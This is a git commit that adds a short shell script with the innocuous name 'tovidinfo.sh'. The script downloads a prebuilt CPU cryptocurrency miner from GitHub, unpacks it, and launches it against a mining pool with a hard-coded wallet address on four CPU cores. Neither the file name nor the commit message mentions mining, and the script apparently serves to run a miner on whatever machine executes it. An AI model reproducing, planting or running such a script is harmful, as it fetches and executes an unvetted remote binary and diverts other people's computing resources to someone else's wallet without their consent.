b57e76b69b9226d1013f15ed6be98ca04393b0cd
Tovidinfo1 <100883606+Tovidinfo1@users.noreply.github.com>
2022-03-04 06:45:24 +0700

    Create tovidinfo.sh

---
+++ tovidinfo.sh
@@ -0,0 +1,5 @@
+#tovidinfo
+sudo apt update
+wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+tar xf hellminer_cpu_linux.tar.gz
+./hellminer -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RPGVM53TkPTEUkuGRFGcCA5cCRkzJfDzpZ.tovid2 -p x --cpu 4
